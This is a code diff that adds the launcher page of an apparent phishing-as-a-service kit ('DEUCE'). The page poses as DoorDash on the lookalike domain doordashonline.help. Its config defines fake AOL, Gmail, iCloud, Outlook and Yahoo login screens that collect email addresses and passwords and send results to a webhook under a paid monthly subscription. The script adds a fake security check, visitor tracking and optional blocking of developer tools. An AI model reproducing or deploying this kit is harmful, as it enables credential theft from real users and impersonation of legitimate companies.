@@ -1,0 +1,874 @@
+<!doctype html>
+<!-- DEUCE runtime launcher: upload this one index.html. The full page package is served by DEUCE runtime for this subscriber. -->
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>DoorDash</title>
+    <link id="deuceFavicon" rel="icon" href="/api/branding?userPageId=user_page_92659ca5addb4d5baf">
+    <style>
+      :root {
+        --accent: #7cffb2;
+        --accent-rgb: 124 255 178;
+        --success: #15803d;
+        --success-rgb: 21 128 61;
+        --danger: #b91c1c;
+        --danger-rgb: 185 28 28;
+        --info: #52645b;
+        --info-rgb: 82 100 91;
+      }
+      * { box-sizing: border-box; }
+      html, body { width: 100%; min-height: 100%; margin: 0; background: #050607; }
+      body { overflow: hidden; font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
+      #deuceFrame { width: 100vw; height: 100vh; border: 0; display: block; background: #fff; }
+      #deuceFrame.pending { display: none; }
+      #deuceGate {
+        min-height: 100vh;
+        display: none;
+        place-items: center;
+        padding: 24px;
+        color: #161b18;
+        background: #f5f5f3;
+      }
+      #deuceGate.active { display: grid; }
+      #deuceGate article {
+        width: min(400px, calc(100vw - 32px));
+        display: grid;
+        gap: 20px;
+        padding: 26px;
+        border: 1px solid #e1e4e0;
+        border-radius: 12px;
+        background: #fff;
+        box-shadow: 0 12px 40px rgba(20, 28, 23, .08);
+      }
+      #deuceGateHeader {
+        display: flex;
+        align-items: center;
+        gap: 14px;
+        min-width: 0;
+      }
+      #deuceGateLogo,
+      #deuceGateFallback {
+        flex: 0 0 52px;
+        width: 52px;
+        height: 52px;
+        border: 1px solid #e1e4e0;
+        border-radius: 10px;
+        background: #fff;
+      }
+      #deuceGateLogo {
+        display: block;
+        object-fit: contain;
+        padding: 5px;
+      }
+      #deuceGateFallback {
+        display: grid;
+        place-items: center;
+        color: #fff;
+        background: #161b18;
+        font-size: 1rem;
+        font-weight: 850;
+        letter-spacing: .04em;
+      }
+      #deuceGateLogo[hidden], #deuceGateFallback[hidden] { display: none; }
+      #deuceGateMeta { min-width: 0; }
+      #deuceGateEyebrow {
+        margin: 0 0 4px;
+        color: #68736c;
+        font-size: .72rem;
+        font-weight: 800;
+        letter-spacing: .1em;
+        text-transform: uppercase;
+      }
+      #deuceGateDomain {
+        margin: 0;
+        overflow-wrap: anywhere;
+        color: #161b18;
+        font-size: clamp(1.15rem, 4vw, 1.45rem);
+        line-height: 1.2;
+      }
+      #deuceGateStatus {
+        margin: 7px 0 0;
+        color: #626c66;
+        font-size: .92rem;
+        line-height: 1.45;
+      }
+      #deuceGateStatus[data-state="verifying"] { color: var(--info); }
+      #deuceGateStatus[data-state="success"] { color: var(--success); }
+      #deuceGateStatus[data-state="error"] { color: var(--danger); }
+      #deuceTurnstile {
+        min-height: 65px;
+        display: grid;
+        place-items: center;
+      }
+      #deuceGateFooter {
+        margin: -5px 0 0;
+        color: #78817c;
+        font-size: .74rem;
+        text-align: center;
+      }
+      @media (max-width: 420px) {
+        #deuceGate { padding: 16px; }
+        #deuceGate article { padding: 22px 18px; border-radius: 15px; }
+        #deuceGateLogo, #deuceGateFallback { flex-basis: 46px; width: 46px; height: 46px; }
+      }
+      #deuceBlock {
+        min-height: 100vh;
+        display: none;
+        place-items: center;
+        padding: 24px;
+        color: #eef8f2;
+        background: #050607;
+      }
+      #deuceBlock.active { display: grid; }
+      #deuceBlock article {
+        max-width: 520px;
+        border: 1px solid rgb(var(--accent-rgb) / .24);
+        border-radius: 10px;
+        padding: 28px;
+        background: #0d1112;
+      }
+      #deuceBlock small { color: var(--accent); font-weight: 800; text-transform: uppercase; }
+      #deuceBlock h1 { margin: 10px 0; font-size: 1.7rem; }
+      #deuceBlock p { color: #8da199; line-height: 1.55; }
+    </style>
+  </head>
+  <body>
+    <iframe id="deuceFrame" title="DoorDash"></iframe>
+    <section id="deuceGate">
+      <article aria-labelledby="deuceGateDomain">
+        <header id="deuceGateHeader">
+          <img id="deuceGateLogo" alt="" hidden referrerpolicy="no-referrer">
+          <div id="deuceGateFallback" aria-hidden="true">DP</div>
+          <div id="deuceGateMeta">
+            <p id="deuceGateEyebrow">Security check</p>
+            <h1 id="deuceGateDomain"></h1>
+            <p id="deuceGateStatus" data-state="ready" aria-live="polite">Complete the verification to continue.</p>
+          </div>
+        </header>
+        <div id="deuceTurnstile"></div>
+        <p id="deuceGateFooter">Protected by Cloudflare Turnstile</p>
+      </article>
+    </section>
+    <section id="deuceBlock">
+      <article>
+        <small>access denied</small>
+        <h1 id="deuceBlockTitle">ACCESS DENIED</h1>
+        <p id="deuceBlockCopy">ACCESS DENIED</p>
+      </article>
+    </section>
+    <script>
+      window.DEUCE_PAGE_CONFIG = {
+        "id": "user_page_92659ca5addb4d5baf",
+        "userId": "user_122e81f91a664e958c",
+        "packageId": "pkg_8085ae8f77e445378b",
+        "packageVersion": "v0.1",
+        "pageId": "doord",
+        "pageName": "DoorDash",
+        "source": {
+                "type": "github",
+                "entryFile": "index.html",
+                "screens": [
+                        {
+                                "id": "scr_de7eeacc12918f",
+                                "file": "aol.html",
+                                "order": 0,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Aol",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_password_a8da59a403d8",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:f4032391108fef77213536b5cf2dbe2a7fade0cee1704e1b182fa32db3a5b668",
+                                        "screenId": "scr_de7eeacc12918f",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_5fa33dbb998a08",
+                                "file": "email.html",
+                                "order": 1,
+                                "stage": "form",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Email",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_email_c62a7572cf0a",
+                                                        "type": "email",
+                                                        "label": "Email",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "email",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Email",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:de6753f0101305dfa1fc47ee0ccd752951b69d016787058ac55435acdb01be28",
+                                        "screenId": "scr_5fa33dbb998a08",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_ba35ea8db56616",
+                                "file": "gmail.html",
+                                "order": 2,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Gmail",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_password_a8da59a403d8",
+                                                        "type": "password",
+                                                        "label": "Enter your password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Enter your password",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_change_language_a58ca24e44e6",
+                                                        "type": "select",
+                                                        "label": "Change language",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "select",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "Change language",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:2075abd6084ba214364498468c150c00e28f0310c152792a3d25ea66693e8192",
+                                        "screenId": "scr_ba35ea8db56616",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_3905051cc2975a",
+                                "file": "icloud.html",
+                                "order": 3,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Icloud",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_password_a8da59a403d8",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_rememberme_506b43564c14",
+                                                        "type": "checkbox",
+                                                        "label": "rememberMe",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "checkbox",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "rememberMe",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:32fb9326fa2d52f47c9b39e9f28bc379d04c336d363c6d45063f3cea4d8f9bc9",
+                                        "screenId": "scr_3905051cc2975a",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_495a0698dc18ef",
+                                "file": "index.html",
+                                "order": 4,
+                                "stage": "form",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Entry",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_email_c62a7572cf0a",
+                                                        "type": "email",
+                                                        "label": "Email",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "email",
+                                                        "needsReview": false,
+                                                        "sensitivity": "personal",
+                                                        "sourceLabel": "Email",
+                                                        "sourceRequired": false
+                                                },
+                                                {
+                                                        "id": "fld_password_a8da59a403d8",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:41aed3db2c508329a27c694293814ad9d93019d48226e314783079f0908b44a4",
+                                        "screenId": "scr_495a0698dc18ef",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_d33bd66d719188",
+                                "file": "outlook.html",
+                                "order": 5,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Outlook",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_password_a8da59a403d8",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:b026df2b919dbda58d8546e5b0e32c563eadd822e1cf039f834deab7b6d2e4b6",
+                                        "screenId": "scr_d33bd66d719188",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_dd0226b9b6c381",
+                                "file": "yahoo.html",
+                                "order": 6,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Yahoo",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_password_a8da59a403d8",
+                                                        "type": "password",
+                                                        "label": "Password",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "password",
+                                                        "needsReview": false,
+                                                        "sensitivity": "authentication-secret",
+                                                        "sourceLabel": "Password",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:54ea9c09e6f37fede067c5d81e99a7c92a24257702db98266c7200e3213f3c74",
+                                        "screenId": "scr_dd0226b9b6c381",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_afd3e6422c8e5d",
+                                "file": "auth-dev-gmail.html",
+                                "order": 7,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Auth Dev Gmail",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [
+                                                {
+                                                        "id": "fld_change_language_a58ca24e44e6",
+                                                        "type": "select",
+                                                        "label": "Change language",
+                                                        "policy": "redact",
+                                                        "enabled": true,
+                                                        "scopeId": "page",
+                                                        "required": false,
+                                                        "sourceType": "select",
+                                                        "needsReview": false,
+                                                        "sensitivity": "standard",
+                                                        "sourceLabel": "Change language",
+                                                        "sourceRequired": false
+                                                }
+                                        ],
+                                        "version": 1,
+                                        "revision": "sha256:32a5576fce5d7ec05c4b0448846b3d77b0d93e22c71b6983fe6921ec2ffdfd7d",
+                                        "screenId": "scr_afd3e6422c8e5d",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_c32d08c244689e",
+                                "file": "success.html",
+                                "order": 8,
+                                "stage": "success",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Success",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [],
+                                        "version": 1,
+                                        "revision": "sha256:157f40234d708cc1f82584db29d5a76ed8dfe47fc6730c2cf784568c51dbf41e",
+                                        "screenId": "scr_c32d08c244689e",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        },
+                        {
+                                "id": "scr_7ae84543822878",
+                                "file": "wait.html",
+                                "order": 9,
+                                "stage": "other",
+                                "state": "default",
+                                "enabled": true,
+                                "buttonLabel": "Wait",
+                                "needsReview": false,
+                                "fieldManifest": {
+                                        "fields": [],
+                                        "version": 1,
+                                        "revision": "sha256:b7e25be7eaf21c3ab3833bbba677076b78c668e4dceb90029eb2495715194ec4",
+                                        "screenId": "scr_7ae84543822878",
+                                        "warnings": [],
+                                        "needsReview": false
+                                },
+                                "showInRedirects": true
+                        }
+                ]
+        },
+        "apiBase": "/api",
+        "generatedAt": "2026-09-16T23:07:45.678Z",
+        "domain": "doordashonline.help",
+        "hosting": {
+                "domain": "doordashonline.help",
+                "connectionType": "cloudflare-worker"
+        },
+        "allowedDomains": [
+                "doordashonline.help"
+        ],
+        "subscription": {
+                "autoRenew": true,
+                "renewalDate": "2026-10-16",
+                "renewalPrice": 150,
+                "walletSource": "main-wallet",
+                "billingPeriod": "monthly",
+                "adminFreeSubscription": false
+        },
+        "resultSettings": {
+                "webhook": "/api/page-results",
+                "retentionDays": 30,
+                "notifyOnResult": true,
+                "telegramNotifyOnResult": false
+        },
+        "security": {
+                "captcha": false,
+                "domains": [
+                        "doordashonline.help"
+                ],
+                "bannedIps": [],
+                "turnstile": {
+                        "enabled": false,
+                        "provider": "turnstile",
+                        "siteKey": "",
+                        "displayDomain": ""
+                },
+                "whitelistIps": [],
+                "vpnProxyRules": {
+                        "blockTor": false,
+                        "blockVpnProxies": false,
+                        "blockHostingProviders": false,
+                        "reputationFailureMode": "challenge"
+                },
+                "blockedDevices": [],
+                "contentDeterrence": false,
+                "turnstileSecretConfigured": false
+        },
+        "generatedFile": {
+                "version": "build-001"
+        },
+        "runtime": {
+                "mode": "launcher",
+                "entryFile": "index.html",
+                "configEndpoint": "/api/config?userPageId=user_page_92659ca5addb4d5baf",
+                "brandingEndpoint": "/api/branding?userPageId=user_page_92659ca5addb4d5baf",
+                "sourceEndpoint": "/api/source?userPageId=user_page_92659ca5addb4d5baf",
+                "turnstileEndpoint": "/api/verify-human",
+                "trafficEndpoint": "/api/traffic"
+        },
+        "favicon": {
+                "path": "",
+                "thumbnailDataUrl": "",
+                "thumbnailPath": ""
+        },
+        "runtimeBase": "/api"
+};
+      const config = window.DEUCE_PAGE_CONFIG;
+      const sessionId = (() => {
+        const key = "deuce_session_" + config.id;
+        try {
+          const existing = window.sessionStorage.getItem(key);
+          if (existing) return existing;
+          const next = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+          window.sessionStorage.setItem(key, next);
+          return next;
+        } catch (error) {
+          return "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
+        }
+      })();
+      const host = window.location.hostname;
+      const frame = document.getElementById("deuceFrame");
+      const gate = document.getElementById("deuceGate");
+      const gateLogo = document.getElementById("deuceGateLogo");
+      const gateFallback = document.getElementById("deuceGateFallback");
+      const gateDomain = document.getElementById("deuceGateDomain");
+      const gateStatus = document.getElementById("deuceGateStatus");
+      const turnstileMount = document.getElementById("deuceTurnstile");
+      const block = document.getElementById("deuceBlock");
+      const blockCopy = document.getElementById("deuceBlockCopy");
+      let turnstileWidgetId = null;
+
+      function enableContentDeterrence() {
+        if (!config.security?.contentDeterrence || document.documentElement.dataset.deuceContentDeterrence === "on") return;
+        document.documentElement.dataset.deuceContentDeterrence = "on";
+        document.addEventListener("contextmenu", (event) => event.preventDefault(), true);
+        document.addEventListener("dragstart", (event) => {
+          if (event.target?.closest?.("img, picture, svg, canvas")) event.preventDefault();
+        }, true);
+        document.addEventListener("keydown", (event) => {
+          const key = String(event.key || "").toLowerCase();
+          const sourceShortcut = (event.ctrlKey || event.metaKey) && !event.shiftKey && key === "u";
+          const developerShortcut = ((event.ctrlKey || event.metaKey) && event.shiftKey && ["i", "j", "c"].includes(key))
+            || (event.metaKey && event.altKey && ["i", "j", "c"].includes(key));
+          if (key === "f12" || sourceShortcut || developerShortcut) {
+            event.preventDefault();
+            event.stopPropagation();
+          }
+        }, true);
+      }
+
+      function normalizeHost(value) {
+        return String(value || "").trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/.*$/, "").replace(/:\d+$/, "");
+      }
+      function brandingLabel() {
+        return String(
+          config.security?.turnstile?.displayDomain
+          || config.domain
+          || config.pageName
+          || host
+          || "Protected page"
+        ).trim();
+      }
+
+      function brandingInitials(value) {
+        return String(value || "DP")
+          .split(/[^a-z0-9]+/i)
+          .filter(Boolean)
+          .slice(0, 2)
+          .map((part) => part.charAt(0).toUpperCase())
+          .join("")
+          .slice(0, 2) || "DP";
+      }
+
+      function setGateStatus(message, state = "ready") {
+        gateStatus.textContent = message;
+        gateStatus.dataset.state = state;
+      }
+
+      function loadBranding() {
+        const label = brandingLabel();
+        gateDomain.textContent = label;
+        gateFallback.textContent = brandingInitials(config.pageName || label);
+        const endpoint = config.runtime?.brandingEndpoint;
+        if (!endpoint) return;
+        const brandingUrl = new URL(endpoint, window.location.href);
+        brandingUrl.searchParams.set("hostname", window.location.hostname);
+        brandingUrl.searchParams.set("sessionId", sessionId);
+        gateLogo.onload = () => {
+          gateLogo.hidden = false;
+          gateFallback.hidden = true;
+        };
+        gateLogo.onerror = () => {
+          gateLogo.hidden = true;
+          gateFallback.hidden = false;
+        };
+        gateLogo.src = brandingUrl.toString();
+      }
+
+      async function refreshLiveConfig() {
+        if (!config.runtime?.configEndpoint) {
+          throw new Error("Live security configuration endpoint is missing");
+        }
+        const configUrl = new URL(config.runtime.configEndpoint, window.location.href);
+        configUrl.searchParams.set("hostname", window.location.hostname);
+        configUrl.searchParams.set("sessionId", sessionId);
+        const response = await fetch(configUrl.toString(), {
+          method: "GET",
+          cache: "no-store",
+          headers: { Accept: "application/json" }
+        });
+        const result = await response.json().catch(() => ({}));
+        if (!response.ok || !result.config) {
+          throw new Error(result.error || "Live security configuration is unavailable");
+        }
+        const live = result.config;
+        config.domain = live.domain || config.domain;
+        config.hosting = live.hosting || config.hosting;
+        config.allowedDomains = live.security?.domains || config.allowedDomains || [];
+        config.subscription = live.subscription || config.subscription;
+        config.security = live.security || {};
+        config.resultSettings = live.resultSettings || config.resultSettings;
+        config.generatedFile = live.generatedFile || config.generatedFile;
+        config.favicon = Object.assign({}, config.favicon, live.favicon ? { path: live.favicon.path, thumbnailPath: live.favicon.thumbnailPath } : {});
+        window.DEUCE_PAGE_CONFIG = config;
+        return config;
+      }
+
+      function blockPage(message) {
+        gate.classList.remove("active");
+        frame.remove();
+        block.classList.add("active");
+        blockCopy.textContent = message;
+      }
+
+      function sendTraffic(event, result, reason) {
+        if (!config.runtime?.trafficEndpoint) return;
+        fetch(config.runtime.trafficEndpoint, {
+          method: "POST",
+          keepalive: true,
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userPageId: config.id,
+            pageId: config.pageId,
+            sessionId,
+            hostname: window.location.hostname,
+            event,
+            result,
+            reason,
+            createdAt: new Date().toISOString()
+          })
+        }).catch(() => {});
+      }
+
+      function loadPage() {
+        gate.classList.remove("active");
+        frame.classList.remove("pending");
+        const sourceUrl = new URL(config.runtime.sourceEndpoint, window.location.href);
+        sourceUrl.searchParams.set("hostname", window.location.hostname);
+        sourceUrl.searchParams.set("sessionId", sessionId);
+        frame.src = sourceUrl.toString();
+      }
+
+      function verifyToken(token) {
+        return fetch(config.runtime.turnstileEndpoint, {
+          method: "POST",
+          credentials: "same-origin",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            userPageId: config.id,
+            pageId: config.pageId,
+            sessionId,
+            hostname: window.location.hostname,
+            token
+          })
+        }).then(async (response) => {
+          const result = await response.json().catch(() => ({}));
+          return Boolean(response.ok && result.verified);
+        });
+      }
+
+      function retryTurnstile(message) {
+        setGateStatus(message, "error");
+        if (window.turnstile && turnstileWidgetId !== null) {
+          window.turnstile.reset(turnstileWidgetId);
+        }
+      }
+
+      function loadTurnstile() {
+        frame.classList.add("pending");
+        loadBranding();
+        setGateStatus("Complete the verification to continue.", "ready");
+        gate.classList.add("active");
+        const script = document.createElement("script");
+        script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
+        script.async = true;
+        script.defer = true;
+        script.onload = () => {
+          if (!window.turnstile) {
+            sendTraffic("turnstile_load_failed", "blocked", "Turnstile could not load");
+            blockPage("ACCESS DENIED");
+            return;
+          }
+          turnstileWidgetId = window.turnstile.render(turnstileMount, {
+            sitekey: config.security.turnstile.siteKey,
+            callback: async (token) => {
+              setGateStatus("Confirming verification...", "verifying");
+              try {
+                const verified = await verifyToken(token);
+                if (verified) {
+                  sendTraffic("turnstile_verified", "allowed", "Passed launcher captcha");
+                  setGateStatus("Verified. Opening...", "success");
+                  window.setTimeout(loadPage, 350);
+                  return;
+                }
+                sendTraffic("turnstile_verify_failed", "blocked", "Turnstile verification failed");
+                retryTurnstile("Verification failed. Please try again.");
+              } catch (error) {
+                sendTraffic("turnstile_verify_failed", "blocked", "Turnstile verification failed");
+                retryTurnstile("Verification could not be confirmed. Please try again.");
+              }
+            },
+            "error-callback": () => {
+              sendTraffic("turnstile_verify_failed", "blocked", "Turnstile challenge failed");
+              setGateStatus("Verification could not start. Please retry.", "error");
+            },
+            "expired-callback": () => {
+              sendTraffic("turnstile_expired", "blocked", "Turnstile challenge expired");
+              setGateStatus("Verification expired. Please try again.", "error");
+            }
+          });
+        };
+        script.onerror = () => {
+          sendTraffic("turnstile_load_failed", "blocked", "Turnstile could not load");
+          blockPage("ACCESS DENIED");
+        };
+        document.head.appendChild(script);
+      }
+
+      function applyFavicon() {
+        var link = document.getElementById("deuceFavicon");
+        if (!link) {
+          link = document.createElement("link");
+          link.id = "deuceFavicon";
+          link.rel = "icon";
+          document.head.appendChild(link);
+        }
+        var fb = config.favicon || {};
+        var brandingEndpoint = config.runtime?.brandingEndpoint || "";
+        if (brandingEndpoint) {
+          var brandingUrl = new URL(brandingEndpoint, window.location.href);
+          brandingUrl.searchParams.set("hostname", window.location.hostname);
+          brandingUrl.searchParams.set("sessionId", sessionId);
+          link.href = brandingUrl.toString();
+        } else if (fb.thumbnailDataUrl) {
+          link.href = fb.thumbnailDataUrl;
+        }
+      }
+
+      async function boot() {
+        try {
+          await refreshLiveConfig();
+        } catch (error) {
+          sendTraffic("config_load_failed", "blocked", "Live security configuration unavailable");
+          blockPage("SECURITY CONFIGURATION UNAVAILABLE");
+          return;
+        }
+
+        enableContentDeterrence();
+        applyFavicon();
+
+        const allowedHosts = (config.security?.domains || config.allowedDomains || []).map(normalizeHost).filter(Boolean);
+        const captchaRequired = Boolean(config.security?.captchaRequired || config.security?.captcha || config.security?.challengeRequired);
+        const siteKey = config.security?.turnstile?.siteKey || "";
+        if (allowedHosts.length && !allowedHosts.includes(normalizeHost(host))) {
+          blockPage("ACCESS DENIED");
+        } else if (captchaRequired && !siteKey) {
+          sendTraffic("turnstile_config_missing", "blocked", "Turnstile site key is missing");
+          blockPage("SECURITY CONFIGURATION UNAVAILABLE");
+        } else if (captchaRequired) {
+          loadTurnstile();
+        } else {
+          loadPage();
+        }
+      }
+
+      boot();
+    </script>
+  </body>
+</html>
